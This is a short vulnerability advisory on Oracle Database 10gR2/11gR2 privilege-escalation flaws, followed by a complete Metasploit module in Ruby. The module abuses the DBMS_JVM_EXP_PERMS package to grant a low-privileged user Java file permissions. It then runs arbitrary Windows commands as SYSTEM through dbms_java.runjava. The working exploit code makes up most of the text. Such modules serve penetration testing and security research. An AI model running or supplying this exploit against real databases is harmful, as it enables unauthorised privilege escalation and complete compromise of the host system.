source: http://www.securityfocus.com/bid/38115/info
 
Oracle Database is prone to multiple remote privilege-escalation issues because it fails to properly restrict access to certain packages.
 
The attacker can exploit these issues to escalate their privileges to DBA or execute arbitrary operating system commands with SYSTEM privileges, leading to a complete compromise of an affected computer.
 
These vulnerabilities affect Oracle Database 11gR2. One of the issues also affects Oracle Database 10gR2. 

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::ORACLE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => ' DBMS_JVM_EXP_PERMS 11g R1/R2 OS Code Execution',
			'Description'    => %q{
				This module exploits a flaw (0 day) in DBMS_JVM_EXP_PERMS package that allows
				any user with create session privilege to grant themselves java IO privileges.
				Identified by David Litchfield. Works on 11g R1 and R2 (Windows only).

			},
			'Author'         => [ 'sid[at]notsosecure.com' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 8822 $',
			'References'     =>
				[
					[ 'URL', 'http://blackhat.com/html/bh-dc-10/bh-dc-10-archives.html#Litchfield' ],
					[ 'URL', 'http://www.notsosecure.com/folder2/2010/02/04/hacking-oracle-11g/' ],
				],
			'DisclosureDate' => 'Feb 1 2010'))

			register_options(
				[
					OptString.new('CMD', [ false, 'CMD to execute.',  "echo metasploit >> %SYSTEMDRIVE%\\\\unbreakable.txt"]),
				], self.class)
	end

	def run
		name = Rex::Text.rand_text_alpha(rand(10) + 1)


		package = "DECLARE POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;CURSOR C1 IS SELECT 'GRANT',USER(), 'SYS','java.io.FilePermission','<<ALL FILES>>','execute','ENABLED' from dual;BEGIN OPEN C1;FETCH C1 BULK COLLECT INTO POL;CLOSE C1;DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);END;"
		os_code = "select dbms_java.runjava('oracle/aurora/util/Wrapper c:\\\\windows\\\\system32\\\\cmd.exe /c  #{datastore['CMD']}')from dual"



		begin
			print_status("Attempting to grant JAVA IO Privileges")
			prepare_exec(package)
			print_status("Attempting to execute OS Code")
			prepare_exec(os_code)
		rescue => e
			print_status("Error: #{e.class} #{e}")
		end
	end

end